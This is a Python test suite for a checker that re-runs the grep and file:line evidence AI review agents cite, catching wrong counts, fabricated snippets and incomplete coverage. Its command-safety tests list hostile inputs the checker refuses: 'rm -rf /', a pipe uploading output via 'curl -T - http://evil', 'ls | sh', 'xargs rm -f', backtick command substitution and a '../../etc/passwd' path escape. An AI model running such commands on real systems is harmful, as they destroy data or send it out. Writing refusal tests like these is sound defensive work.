#!/usr/bin/env python3
"""Tests for verify_clears: re-running a review's cited evidence.

The module is deliberately project-agnostic — it never interprets a command or
the code it matches, only whether the claim reproduces. These tests use a throw-
away tree of plain text files to keep that honest: nothing here is language- or
framework-specific, and the checker would behave identically on any repo.

    python3 -m unittest discover installer/tests
"""
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

LIB = Path(__file__).resolve().parents[1] / "templates" / ".claude" / "hooks" / "lib"
sys.path.insert(0, str(LIB))
import verify_clears as vc  # noqa: E402


class Base(unittest.TestCase):
    def setUp(self):
        self.td = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.td, ignore_errors=True)

    def write(self, rel, text):
        p = self.td / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
        return p

    def run_on(self, cleared_body, section="Sections cleared"):
        f = self.write("findings.md",
                       f"# Review\n\n## Findings\n- none\n\n## {section}\n{cleared_body}\n")
        return vc.verify(f, self.td)

    def statuses(self, rep):
        return [r["status"] for r in rep["results"]]


class TestCommandCitations(Base):
    def test_reproduced_when_count_matches(self):
        # `grep -c` reports 2 matching lines here. This asserted 1 and passed
        # only because output LINES were counted (one line reading "2") — the
        # bug fixed in test_pipe_to_wc_l_reads_the_number_not_the_line_count.
        self.write("a.txt", "alpha\nbeta\nalpha\n")
        rep = self.run_on('- **Item A** — cleared by: `grep -c alpha a.txt` -> 2 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_zero_matches_phrasings(self):
        self.write("a.txt", "nothing here\n")
        for phrasing in ("no matches", "0 matches", "zero hits"):
            rep = self.run_on(f'- **X** — cleared by: `grep -rn banned a.txt` -> {phrasing}')
            self.assertEqual(self.statuses(rep), ["reproduced"], phrasing)

    def test_mismatch_is_caught(self):
        # The Snuggle failure in miniature: the review claims a count, the code
        # says otherwise. The checker needs no idea what is being counted.
        for i in range(5):
            self.write(f"src/f{i}.txt", "brandGradient\n")
        rep = self.run_on('- **Gradient** — cleared by: `grep -rl brandGradient src` -> 3 matches')
        r = rep["results"][0]
        self.assertEqual(r["status"], "mismatch")
        self.assertEqual(r["actual"], 5)
        self.assertIn("claimed 3", r["detail"])

    def test_broken_command_is_caught_not_silently_passed(self):
        # A citation pointing at a path that does not exist must fail loudly —
        # this is the "the cd failed and the grep ran elsewhere" case.
        rep = self.run_on('- **X** — cleared by: `grep -rn foo does/not/exist` -> no matches')
        self.assertEqual(self.statuses(rep), ["failed"])

    def test_grep_exit_1_is_a_real_zero(self):
        self.write("a.txt", "content\n")
        rep = self.run_on('- **X** — cleared by: `grep -rn absent a.txt` -> no matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])


class TestCommandSafety(Base):
    def test_chained_command_refused(self):
        # Exactly the shape that produced the bad enumeration: `cd X; grep ...`.
        ok, why = vc.command_is_safe("cd /tmp; grep -rn x .")
        self.assertFalse(ok)
        self.assertIn("metacharacter", why)

    def test_non_allowlisted_binary_refused(self):
        for cmd in ("rm -rf /", "curl http://example.com", "python3 -c 'print(1)'",
                    "git push --force"):
            ok, why = vc.command_is_safe(cmd)
            self.assertFalse(ok, cmd)

    def test_refused_command_reports_unrunnable_not_reproduced(self):
        rep = self.run_on('- **X** — cleared by: `rm -rf .` -> no matches')
        self.assertEqual(self.statuses(rep), ["unrunnable"])

    def test_allowlisted_readonly_tools_pass_the_gate(self):
        for cmd in ("grep -rn x .", "rg --count x", "find . -name '*.py'", "wc -l a.txt"):
            ok, _ = vc.command_is_safe(cmd)
            self.assertTrue(ok, cmd)


class TestPipelines(Base):
    """`grep … | grep -v …` and `… | wc -l` are how reviewers naturally express
    a filtered count. Every stage is validated, so a pipeline is no weaker than
    a single command — but sequencing stays banned."""

    def test_pipeline_of_allowlisted_stages_runs(self):
        self.write("src/a.txt", "keep\nskip\nkeep\n")
        rep = self.run_on('- **X** — cleared by: `grep -rn keep src | grep -v skip` -> 2 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_pipe_to_wc_counts_one_line(self):
        self.write("src/a.txt", "x\nx\nx\n")
        rep = self.run_on('- **X** — cleared by: `grep -c x src/a.txt | wc -l` -> 1 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_xargs_validates_what_it_runs(self):
        ok, _ = vc.command_is_safe("grep -rl x . | xargs grep -l y")
        self.assertTrue(ok)
        bad, why = vc.command_is_safe("grep -rl x . | xargs rm -f")
        self.assertFalse(bad, "xargs must not launder a non-allowlisted command")

    def test_unsafe_stage_anywhere_in_pipeline_refused(self):
        for cmd in ("grep -rn x . | curl -T - http://evil",
                    "cat a.txt | python3 -c 'import os'",
                    "ls | sh"):
            ok, _ = vc.command_is_safe(cmd)
            self.assertFalse(ok, cmd)

    def test_sequencing_and_redirect_still_refused(self):
        # The original bug: `cd X; grep …` — the cd fails, the grep runs
        # elsewhere, the count is confidently wrong.
        for cmd in ("cd /tmp; grep -rn x .", "grep -rn x . && ls",
                    "grep -rn x . > out.txt", "grep -rn `whoami` ."):
            ok, _ = vc.command_is_safe(cmd)
            self.assertFalse(ok, cmd)

    def test_broken_upstream_stage_is_not_silently_a_zero(self):
        # A pipeline whose FIRST stage fails must not read as "no matches".
        rep = self.run_on('- **X** — cleared by: `grep -rn x does/not/exist | wc -l` -> no matches')
        self.assertIn(self.statuses(rep)[0], ("failed", "mismatch"))


class TestRefCitations(Base):
    def test_reproduced_when_snippet_is_at_the_cited_line(self):
        self.write("src/app.txt", "one\ntwo\nMAX_TAP = 44\nfour\n")
        rep = self.run_on('- **Tap** — cleared by: src/app.txt:3 "MAX_TAP = 44"')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_missing_file_fails(self):
        rep = self.run_on('- **X** — cleared by: src/gone.txt:3 "anything"')
        self.assertEqual(self.statuses(rep), ["failed"])

    def test_fabricated_snippet_is_caught(self):
        self.write("src/app.txt", "one\ntwo\nthree\n")
        rep = self.run_on('- **X** — cleared by: src/app.txt:2 "guard clause present"')
        self.assertEqual(self.statuses(rep), ["mismatch"])

    def test_small_drift_is_stale_not_failure(self):
        # Code moves. Off by two lines is a stale citation, not a fabricated one.
        self.write("src/app.txt", "a\nb\nc\nMAX_TAP = 44\n")
        rep = self.run_on('- **X** — cleared by: src/app.txt:2 "MAX_TAP = 44"')
        r = rep["results"][0]
        self.assertEqual(r["status"], "stale")
        self.assertNotIn(r["status"], vc.FAILING)

    def test_line_past_end_of_file(self):
        self.write("src/app.txt", "a\n")
        rep = self.run_on('- **X** — cleared by: src/app.txt:900 "whatever"')
        self.assertEqual(self.statuses(rep), ["mismatch"])

    def test_backtick_wrapped_path_is_parsed(self):
        # Markdown habit — agents write `path/file.dart:36` in code ticks.
        self.write("src/app.txt", "one\ntwo\nMAX = 44\n")
        rep = self.run_on('- **X** — cleared by: `src/app.txt:3` "MAX = 44"')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_line_range_citation(self):
        self.write("src/app.txt", "a\nb\nwidth: tapTarget,\nd\n")
        rep = self.run_on('- **X** — cleared by: src/app.txt:2-4 "width: tapTarget,"')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_range_miss_still_caught(self):
        self.write("src/app.txt", "a\nb\nc\nd\ne\nf\ng\nh\nTARGET\n")
        rep = self.run_on('- **X** — cleared by: src/app.txt:1-2 "TARGET"')
        self.assertIn(self.statuses(rep)[0], ("mismatch", "stale"))

    def test_path_escaping_project_refused(self):
        rep = self.run_on('- **X** — cleared by: ../../etc/passwd:1 "root"')
        self.assertEqual(self.statuses(rep), ["unrunnable"])


class TestClassification(Base):
    def test_unverified_is_reported_not_failed(self):
        # The honest outcome. Must never be penalised, or the incentive inverts
        # and the agent goes back to inventing clears.
        rep = self.run_on('- **Chip disabled state** — unverified — no live instance to check')
        self.assertEqual(self.statuses(rep), ["unverified"])
        self.assertNotIn("unverified", vc.FAILING)

    def test_bare_clear_with_no_evidence_fails(self):
        rep = self.run_on("- **§9 Contrast** — all token colors pass AA thresholds ✓")
        self.assertEqual(self.statuses(rep), ["uncited"])
        self.assertIn("uncited", vc.FAILING)

    def test_multiline_bullet_is_parsed_as_one_item(self):
        self.write("a.txt", "x\n")
        rep = self.run_on(
            '- **Item** — cleared by: `grep -c x a.txt` -> 1 matches\n'
            '  with some trailing prose on a continuation line explaining why.')
        self.assertEqual(len(rep["results"]), 1)
        self.assertEqual(rep["results"][0]["status"], "reproduced")

    def test_missing_section_is_a_note_not_a_crash(self):
        f = self.write("findings.md", "# Review\n\n## Findings\n- one\n")
        rep = vc.verify(f, self.td)
        self.assertEqual(rep["results"], [])
        self.assertIn("no cleared sections", rep["note"])

    def test_section_name_is_configurable_for_other_agents(self):
        # security-reviewer uses "Categories cleared", architect uses
        # "Dimensions with no issues".
        self.write("a.txt", "x\n")
        rep = self.run_on('- **Injection** — cleared by: `grep -c x a.txt` -> 1 matches',
                          section="Categories cleared")
        self.assertEqual(self.statuses(rep), ["reproduced"])


class TestAutoDetectSections(Base):
    """No --section: every agent's clear heading must be found by one invocation."""

    def scan(self, doc):
        f = self.write("findings.md", doc)
        return vc.verify(f, self.td)

    def test_each_agents_heading_is_detected(self):
        self.write("a.txt", "x\n")
        cite = "cleared by: `grep -c x a.txt` -> 1 matches"
        for heading in ("Sections cleared", "Categories cleared",
                        "Dimensions with no issues", "Dimensions cleared"):
            rep = self.scan(f"# R\n\n## {heading}\n- **Item** — {cite}\n")
            self.assertEqual([r["status"] for r in rep["results"]], ["reproduced"],
                             f"heading not detected: {heading}")

    def test_non_clear_sections_do_not_demand_citations(self):
        # Prose in a Findings section is not a failure — a finding points at a
        # defect, it does not assert one is absent.
        rep = self.scan("# R\n\n## Findings\n### U01 — [HIGH] something\n"
                        "**Observed:** plain prose with no citation at all.\n")
        self.assertEqual(rep["results"], [])

    def test_mixed_document_classifies_both(self):
        self.write("a.txt", "x\n")
        rep = self.scan(
            "# R\n\n## Findings\n### U01 — [HIGH] thing\n"
            "**Where:** enumerated by: `grep -c x a.txt` -> 1 matches\n\n"
            "## Sections cleared\n"
            "- **Item** — cleared by: `grep -c x a.txt` -> 1 matches\n")
        claims = sorted(r["claim"] for r in rep["results"])
        self.assertEqual(claims, ["clear", "finding"])
        self.assertTrue(all(r["status"] == "reproduced" for r in rep["results"]))


class TestFindingEnumeration(Base):
    """A finding that under-counts its own site list is the quiet half of the
    same problem: the defect is real, the scope is wrong, and a developer who
    fixes the listed sites believes they are done."""

    def scan(self, doc):
        f = self.write("findings.md", doc)
        return vc.verify(f, self.td)

    def test_undercounted_site_list_is_caught(self):
        for i in range(9):
            self.write(f"src/f{i}.txt", "violation\n")
        rep = self.scan("# R\n\n## Findings\n### U02 — [HIGH] bad pattern\n"
                        "**Where:** enumerated by: `grep -rl violation src` -> 3 sites\n")
        r = rep["results"][0]
        self.assertEqual(r["status"], "mismatch")
        self.assertEqual(r["claim"], "finding")
        self.assertIn("claimed 3", r["detail"])
        self.assertTrue(vc.is_failing(r))

    def test_accurate_site_list_passes(self):
        for i in range(3):
            self.write(f"src/f{i}.txt", "violation\n")
        rep = self.scan("# R\n\n## Findings\n### U02 — [HIGH] bad pattern\n"
                        "**Where:** enumerated by: `grep -rl violation src` -> 3 sites\n")
        self.assertEqual([r["status"] for r in rep["results"]], ["reproduced"])

    def test_uncited_finding_does_not_fail_but_uncited_clear_does(self):
        doc = ("# R\n\n## Findings\n### U01 — prose only, no citation\n"
               "**Observed:** something is wrong.\n\n"
               "## Sections cleared\n- **Item** — looks fine to me ✓\n")
        rep = self.scan(doc)
        by_claim = {r["claim"]: r for r in rep["results"]}
        self.assertNotIn("finding", by_claim)          # prose finding: ignored
        self.assertEqual(by_claim["clear"]["status"], "uncited")
        self.assertTrue(vc.is_failing(by_claim["clear"]))


class TestRealWorldCitationShapes(Base):
    """Regressions from citations a live reviewer actually wrote. Each of these
    was rejected by an over-narrow parser, not by a bad citation — the checker
    reporting `unrunnable` on valid evidence is itself a failure, since it
    silently converts a verified item into an unverified one."""

    def test_pipe_inside_a_quoted_regex_is_not_a_pipeline_separator(self):
        # `grep -E "circular\((11|18|19)\)"` is ONE command. Splitting on every
        # `|` corrupted the quoting and the whole citation failed to parse.
        self.write("src/a.txt", "circular(11)\ncircular(18)\nother\n")
        rep = self.run_on(
            '- **Radius** — cleared by: '
            r'`grep -rEn "circular\((11|18|19)\)" src` -> 2 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_bre_backslash_escapes_are_tolerated(self):
        # POSIX shlex rejects \| and \{ inside double quotes; a real shell passes
        # them to grep untouched, and that is how BRE alternation is written.
        self.write("src/a.txt", "alpha\nbeta\n")
        rep = self.run_on(
            r'- **X** — cleared by: `grep -rn "alpha\|beta" src` -> 2 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_snippet_spanning_two_lines_within_a_cited_range(self):
        # Agents quote a range as one string; the code has it on separate lines.
        self.write("src/a.txt", "x\nwidth: tapTarget,\nheight: tapTarget,\ny\n")
        rep = self.run_on(
            '- **Tap** — cleared by: src/a.txt:2-3 "width: tapTarget, height: tapTarget,"')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_pipe_to_wc_l_reads_the_number_not_the_line_count(self):
        # Regression: `grep … | wc -l` prints one line reading "0". Counting its
        # LINES gives 1, turning a true "no matches" clear into a false mismatch.
        self.write("src/a.txt", "nothing relevant\n")
        rep = self.run_on(
            '- **X** — cleared by: `grep -rn absent src | wc -l` -> 0 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_pipe_to_wc_l_with_a_real_count(self):
        self.write("src/a.txt", "hit\nhit\nhit\n")
        rep = self.run_on(
            '- **X** — cleared by: `grep -rn hit src | wc -l` -> 3 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_grep_dash_c_reads_the_number(self):
        self.write("src/a.txt", "hit\nhit\n")
        rep = self.run_on('- **X** — cleared by: `grep -c hit src/a.txt` -> 2 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_counting_command_still_catches_a_wrong_count(self):
        self.write("src/a.txt", "hit\nhit\n")
        rep = self.run_on(
            '- **X** — cleared by: `grep -rn hit src | wc -l` -> 9 matches')
        self.assertEqual(self.statuses(rep), ["mismatch"])
        self.assertEqual(rep["results"][0]["actual"], 2)

    def test_prose_between_verb_and_command_still_parses(self):
        # Regression: "enumerated by manually inspecting all 39 call sites
        # (denominator: `cmd` -> 39 matches)" is a good citation. Demanding the
        # backtick immediately after the verb rejected it and reported the
        # finding as having no denominator at all.
        self.write("src/a.txt", "x\nx\n")
        rep = self.run_on(
            '- **X** — enumerated by manually inspecting every call site '
            '(denominator: `grep -c x src/a.txt` -> 2 matches)')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_backticked_prose_before_the_command_is_skipped(self):
        # "enumerated by inspecting all call sites of `context.brandGradient`
        # (denominator: `grep … | wc -l` -> 39 matches)" — the FIRST backticked
        # span is prose, not the command. A fixed bridge stopped at it and
        # rejected the citation; scanning forward finds the one with a count.
        self.write("src/a.txt", "x\nx\n")
        rep = self.run_on(
            '- **X** — enumerated by inspecting all call sites of `SomeSymbol` '
            '(denominator: `grep -c x src/a.txt` -> 2 matches)')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_a_verb_cannot_bind_to_a_different_bullets_command(self):
        # The real containment guard: citations are per-bullet, so an uncited
        # clear must not borrow the next bullet's evidence.
        self.write("src/a.txt", "x\n")
        rep = self.run_on(
            '- **Uncited** — looks fine to me\n'
            '- **Cited** — cleared by: `grep -c x src/a.txt` -> 1 matches')
        self.assertEqual(self.statuses(rep), ["uncited", "reproduced"])

    def test_cleared_for_phrasing_accepted(self):
        self.write("src/a.txt", "x\n")
        rep = self.run_on(
            '- **X** — cleared for the sampled files: `grep -c x src/a.txt` -> 1 matches')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_backtick_wrapped_snippet_inside_quotes(self):
        # Agents write the snippet as markdown code: "`final x = 44;`".
        # The backticks are in the citation, never in the file.
        self.write("src/app.txt", "a\nfinal x = 44;\nb\n")
        rep = self.run_on('- **X** — cleared by: src/app.txt:2 "`final x = 44;`"')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_elided_snippet_matches_anchors_in_order(self):
        # "default: ... return ThemeMode.system;" is a normal way to cite two
        # anchors around a comment block.
        self.write("src/a.txt",
                   "switch (x) {\n  default:\n    // a comment\n"
                   "    return ThemeMode.system;\n}\n")
        rep = self.run_on(
            '- **X** — cleared by: src/a.txt:2-4 "default: ... return ThemeMode.system;"')
        self.assertEqual(self.statuses(rep), ["reproduced"])

    def test_elided_snippet_requires_the_anchors_in_order(self):
        self.write("src/a.txt", "  return ThemeMode.system;\n  default:\n")
        rep = self.run_on(
            '- **X** — cleared by: src/a.txt:1-2 "default: ... return ThemeMode.system;"')
        self.assertEqual(self.statuses(rep), ["mismatch"])

    def test_elided_snippet_still_needs_every_anchor_present(self):
        self.write("src/a.txt", "  default:\n    // nothing else here\n")
        rep = self.run_on(
            '- **X** — cleared by: src/a.txt:1-2 "default: ... return ThemeMode.system;"')
        self.assertEqual(self.statuses(rep), ["mismatch"])

    def test_parenthesised_description_is_not_a_citation(self):
        # Quotes mean verbatim. A description of the code cannot be checked
        # against the code, so it must not pass as evidence.
        self.write("src/a.txt", "gradient: disabled ? null : buttonGradient,\n")
        rep = self.run_on(
            '- **X** — cleared by: `src/a.txt:1` (disabled drops the gradient)')
        self.assertEqual(self.statuses(rep), ["uncited"])

    def test_widened_parser_still_catches_a_wrong_count(self):
        # The point of the widening was fewer false rejections, not fewer real
        # catches. A falsified count must still fail.
        self.write("src/a.txt", "hit\nhit\n")
        rep = self.run_on(
            r'- **X** — cleared by: `grep -rn "hit\|miss" src` -> 9 matches')
        self.assertEqual(self.statuses(rep), ["mismatch"])


class TestMultiSiteFindingsNeedEnumeration(Base):
    """A finding listing several sites is a claim about a class of occurrences.
    Without the search behind it there is no denominator, so "3 sites" and
    "3 of 40 sites" look identical — and fixing the listed three looks done."""

    def scan(self, doc):
        f = self.write("findings.md", doc)
        return vc.verify(f, self.td)

    def test_multiple_sites_without_enumeration_fails(self):
        rep = self.scan(
            "# R\n\n## Findings\n### U02 — [HIGH] bad pattern\n"
            "**Where:**\n"
            "- `src/a.dart:12` — one\n"
            "- `src/b.dart:44` — two\n")
        r = rep["results"][0]
        self.assertEqual(r["status"], "uncited")
        self.assertTrue(vc.is_failing(r))
        self.assertIn("2 sites", r["detail"])

    def test_single_site_finding_is_left_alone(self):
        # A specific one-off defect needs no search behind it.
        rep = self.scan("# R\n\n## Findings\n### U01 — [HIGH] thing\n"
                        "**Where:** `src/a.dart:12` — the one bad spot\n")
        self.assertEqual(rep["results"], [])

    def test_prose_finding_without_sites_is_left_alone(self):
        rep = self.scan("# R\n\n## Findings\n### U01 — [HIGH] thing\n"
                        "**Where:** throughout the theme layer, described below\n")
        self.assertEqual(rep["results"], [])

    def test_enumeration_present_satisfies_the_rule(self):
        self.write("src/a.dart", "x\n")
        self.write("src/b.dart", "x\n")
        rep = self.scan(
            "# R\n\n## Findings\n### U02 — [HIGH] bad pattern\n"
            "**Where:** enumerated by: `grep -rl x src` -> 2 sites\n"
            "- `src/a.dart:12`\n- `src/b.dart:44`\n")
        self.assertEqual([r["status"] for r in rep["results"]], ["reproduced"])

    def test_each_finding_judged_separately(self):
        rep = self.scan(
            "# R\n\n## Findings\n"
            "### U01 — single site\n**Where:** `src/a.dart:1` — fine\n\n"
            "### U02 — multi site\n**Where:**\n- `src/b.dart:2`\n- `src/c.dart:3`\n")
        self.assertEqual(len(rep["results"]), 1)
        self.assertIn("2 sites", rep["results"][0]["detail"])

    def test_ratios_and_versions_in_prose_are_not_site_references(self):
        # Regression: "4.5:1" / "3.24:1" contrast ratios parsed as file:line and
        # flagged a single-site finding as listing four. A false FAIL here is as
        # damaging as a miss — it trains the reader to ignore the checker.
        rep = self.scan(
            "# R\n\n## Findings\n### U02 — [HIGH] contrast\n"
            "**Where:** `src/a.dart:118` — the one button\n"
            "**Observed:** stops read 3.24:1 and 2.28:1, below the 4.5:1 floor; "
            "see also v1.2:3 in the notes.\n")
        self.assertEqual(rep["results"], [],
                         "ratios must not be counted as cited sites")

    def test_real_multi_site_still_caught_alongside_ratios(self):
        rep = self.scan(
            "# R\n\n## Findings\n### U02 — [HIGH] contrast\n"
            "**Where:**\n- `src/a.dart:118`\n- `src/b.dart:44`\n"
            "**Observed:** below the 4.5:1 floor.\n")
        self.assertEqual(rep["results"][0]["detail"].split()[1], "2")

    def test_cleared_section_is_not_swept_by_this_rule(self):
        # Clears are handled by the bullet path; this must not double-report.
        self.write("src/a.txt", "x\n")
        rep = self.scan("# R\n\n## Sections cleared\n"
                        "- **X** — cleared by: `grep -c x src/a.txt` -> 1 matches\n")
        self.assertEqual([r["status"] for r in rep["results"]], ["reproduced"])


class TestCoverage(Base):
    """Citations prove what was claimed. Only a coverage count catches a rule
    the review never examined — that leaves no false claim behind, just silence,
    which reads exactly like a rule that passed."""

    SPEC = ("# Spec\n\n## 13. Enforcement checklist\n"
            "- [ ] colours resolve to tokens\n"
            "- [ ] spacing comes from the scale\n"
            "- [ ] contrast meets the floor\n")

    def run_cov(self, coverage_block):
        self.write("spec.md", self.SPEC)
        f = self.write("findings.md", f"# R\n\n{coverage_block}\n")
        return vc.verify(f, self.td, self.td / "spec.md")["coverage"]

    TABLE_HEAD = "## Coverage\n| # | item | search | result |\n|---|---|---|---|\n"

    def test_complete_when_every_item_has_a_row(self):
        cov = self.run_cov(self.TABLE_HEAD
                           + "| 1 | colours | `grep -c x a` -> 0 matches | none |\n"
                           + "| 2 | spacing | — | unverified — no scale |\n"
                           + "| 3 | contrast | `grep -c y b` -> 2 matches | U01 |\n")
        self.assertEqual(cov["status"], "complete")
        self.assertEqual(cov["expected"], 3)

    def test_incomplete_when_rows_are_missing(self):
        cov = self.run_cov(self.TABLE_HEAD
                           + "| 1 | colours | `grep -c x a` -> 0 matches | none |\n")
        self.assertEqual(cov["status"], "incomplete")
        self.assertIn("2 of 3", cov["detail"])

    def test_missing_when_there_is_no_coverage_table(self):
        cov = self.run_cov("## Findings\n### U01 — something\n")
        self.assertEqual(cov["status"], "missing")
        self.assertEqual(cov["expected"], 3)

    def test_unverified_rows_count_as_coverage(self):
        # Honesty must satisfy the count, or the incentive inverts and the
        # reviewer invents rows to make the number work.
        cov = self.run_cov(self.TABLE_HEAD
                           + "| 1 | colours | — | unverified — no tooling |\n"
                           + "| 2 | spacing | — | unverified — no tooling |\n"
                           + "| 3 | contrast | — | unverified — needs rendering |\n")
        self.assertEqual(cov["status"], "complete")

    def test_separator_and_header_rows_are_not_counted(self):
        cov = self.run_cov(self.TABLE_HEAD + "| 1 | a | — | unverified — x |\n")
        self.assertEqual(cov["rows"], 1)

    def test_coverage_row_search_is_re_run(self):
        # Most enumeration claims now live in the Coverage table rather than in
        # cleared bullets. Counting rows without re-running their searches meant
        # a row could claim any number and pass.
        for i in range(9):
            self.write(f"src/f{i}.txt", "violation\n")
        f = self.write("findings.md",
                       "# R\n\n## Coverage\n"
                       "| # | item | search | inspected | result |\n|---|---|---|---|---|\n"
                       "| 1 | pattern | `grep -rl violation src` -> 3 matches | 3 of 3 | U01 |\n")
        rep = vc.verify(f, self.td)
        r = next(x for x in rep["results"] if x.get("claim") == "coverage")
        self.assertEqual(r["status"], "mismatch")
        self.assertEqual(r["actual"], 9)
        self.assertTrue(vc.is_failing(r))

    def test_coverage_row_search_that_holds_passes(self):
        for i in range(3):
            self.write(f"src/f{i}.txt", "violation\n")
        f = self.write("findings.md",
                       "# R\n\n## Coverage\n"
                       "| # | item | search | inspected | result |\n|---|---|---|---|---|\n"
                       "| 1 | pattern | `grep -rl violation src` -> 3 matches | 3 of 3 | U01 |\n")
        rep = vc.verify(f, self.td)
        self.assertEqual([r["status"] for r in rep["results"]], ["reproduced"])

    def test_markdown_escaped_pipe_in_a_coverage_row(self):
        # Table cells write a literal pipe as `\|`. Left escaped, the pipeline
        # parses as ONE command with `|` as a filename argument, which greps far
        # more than intended and reports a wildly wrong count.
        self.write("src/a.txt", "keep\nskip\nkeep\n")
        f = self.write("findings.md",
                       "# R\n\n## Coverage\n"
                       "| # | item | search | result |\n|---|---|---|---|\n"
                       r"| 1 | filtered | `grep -rn keep src \| grep -v skip` -> 2 matches | none |"
                       "\n")
        rep = vc.verify(f, self.td)
        self.assertEqual([r["status"] for r in rep["results"]], ["reproduced"])

    def test_coverage_row_label_prefers_the_item_cell(self):
        # The item name often contains `code`; skipping ticked cells picked the
        # result cell instead, labelling every row "none (cleared)".
        self.write("src/a.txt", "x\n")
        f = self.write("findings.md",
                       "# R\n\n## Coverage\n"
                       "| # | item | search | result |\n|---|---|---|---|\n"
                       "| 2 | `textHint` never on real text | `grep -c x src/a.txt` -> 9 matches | none (cleared) |\n")
        rep = vc.verify(f, self.td)
        self.assertIn("textHint", rep["results"][0]["item"])

    def test_coverage_row_without_a_command_is_not_a_failure(self):
        # "— | unverified — no tooling" rows carry no search to re-run.
        f = self.write("findings.md",
                       "# R\n\n## Coverage\n"
                       "| # | item | search | inspected | result |\n|---|---|---|---|---|\n"
                       "| 1 | pattern | — | — | unverified — needs rendering |\n")
        self.assertEqual(vc.verify(f, self.td)["results"], [])

    def test_partial_inspection_is_surfaced(self):
        # A search returning 38 with only 12 read finds whatever is in those 12
        # and reports it in a row shaped exactly like a full sweep. This is how
        # profile_card_hero.dart:227 was missed in a file where :156 was found.
        f = self.write("findings.md",
                       "# R\n\n## Coverage\n"
                       "| # | item | search | inspected | result |\n|---|---|---|---|---|\n"
                       "| 1 | contrast | `grep -rn x .` -> 38 matches | 12 of 38 | U01 |\n")
        rep = vc.verify(f, self.td)
        self.assertEqual(len(rep["partial"]), 1)
        self.assertEqual((rep["partial"][0]["seen"], rep["partial"][0]["total"]), (12, 38))

    def test_full_inspection_is_not_flagged(self):
        f = self.write("findings.md",
                       "# R\n\n## Coverage\n"
                       "| # | item | search | inspected | result |\n|---|---|---|---|---|\n"
                       "| 1 | contrast | `grep -rn x .` -> 38 matches | 38 of 38 | U01 |\n")
        self.assertEqual(vc.verify(f, self.td)["partial"], [])

    def test_partial_inspection_does_not_fail_the_run(self):
        # Penalising the gap would just push the number up — the same incentive
        # trap as penalising `unverified`. Visibility is the goal.
        self.write("src/a.txt", "x\n")
        f = self.write("findings.md",
                       "# R\n\n## Coverage\n"
                       "| # | item | search | inspected | result |\n|---|---|---|---|---|\n"
                       "| 1 | contrast | `grep -c x src/a.txt` -> 1 matches | 3 of 40 | U01 |\n")
        self.assertEqual(vc.main([str(f), "--cwd", str(self.td)]), 0)

    def test_spec_without_a_checklist_is_reported_not_failed(self):
        self.write("plain.md", "# Spec\n\nProse only, no checklist.\n")
        f = self.write("findings.md", "# R\n\n## Findings\n- x\n")
        cov = vc.verify(f, self.td, self.td / "plain.md")["coverage"]
        self.assertEqual(cov["status"], "no-checklist")

    def test_coverage_failure_sets_exit_1(self):
        self.write("spec.md", self.SPEC)
        f = self.write("findings.md", "# R\n\n## Findings\n### U01 — x\n")
        self.assertEqual(
            vc.main([str(f), "--cwd", str(self.td),
                     "--checklist", str(self.td / "spec.md")]), 1)

    def test_no_checklist_flag_leaves_behaviour_unchanged(self):
        self.write("src/a.txt", "x\n")
        f = self.write("findings.md", "## Sections cleared\n"
                       "- **X** — cleared by: `grep -c x src/a.txt` -> 1 matches\n")
        rep = vc.verify(f, self.td)
        self.assertIsNone(rep["coverage"])
        self.assertEqual(vc.main([str(f), "--cwd", str(self.td)]), 0)


class TestShippedChecklistsAreExtractable(Base):
    """The coverage check is only wired up if the shipped agent checklists parse.
    These break loudly if someone reformats a checklist out of task-list syntax,
    which would otherwise silently disable enforcement for that agent."""

    AGENTS = Path(__file__).resolve().parents[1] / "templates" / ".claude" / "agents"

    def test_security_reviewer_attacker_checklist_parses(self):
        items = vc.checklist_items(self.AGENTS / "security-reviewer.md")
        self.assertGreaterEqual(len(items), 8)
        joined = " ".join(items).lower()
        for expected in ("access control", "injection", "supply chain"):
            self.assertIn(expected, joined)

    def test_architect_dimension_checklist_parses(self):
        items = vc.checklist_items(self.AGENTS / "architect.md")
        self.assertGreaterEqual(len(items), 7)
        joined = " ".join(items).lower()
        for expected in ("data ownership", "tenancy", "blast radius"):
            self.assertIn(expected, joined)

    def test_reviewer_evaluation_areas_parse(self):
        items = vc.checklist_items(self.AGENTS / "reviewer.md")
        self.assertEqual(len(items), 5)
        joined = " ".join(items).lower()
        for expected in ("adr violations", "anti-patterns", "edge-case", "security smells"):
            self.assertIn(expected, joined)

    def test_auditor_issue_types_parse(self):
        items = vc.checklist_items(self.AGENTS / "auditor.md")
        self.assertEqual(len(items), 4)
        joined = " ".join(items).lower()
        for expected in ("inconsistency", "duplication", "bad practice", "oversized"):
            self.assertIn(expected, joined)

    def test_tester_has_no_agent_level_checklist(self):
        # Correct: the tester's expected set is per-task (the task file's own
        # `- [ ]` items), not a fixed list in the agent. A checklist appearing
        # here would mean someone wired the wrong source.
        self.assertEqual(vc.checklist_items(self.AGENTS / "tester.md"), [])

    def test_a_report_missing_rows_fails_against_a_shipped_checklist(self):
        f = self.write("findings.md",
                       "# Security Review\n\n## Coverage\n"
                       "| # | category | checked | result |\n|---|---|---|---|\n"
                       "| 1 | Broken access control | `grep -c x a` -> 0 matches | none |\n"
                       "\n## Threat model\n### S01 — something\n")
        cov = vc.verify(f, self.td,
                        self.AGENTS / "security-reviewer.md")["coverage"]
        self.assertEqual(cov["status"], "incomplete")
        self.assertGreaterEqual(cov["expected"], 8)


class TestExitCode(Base):
    def test_exit_1_when_a_clear_does_not_reproduce(self):
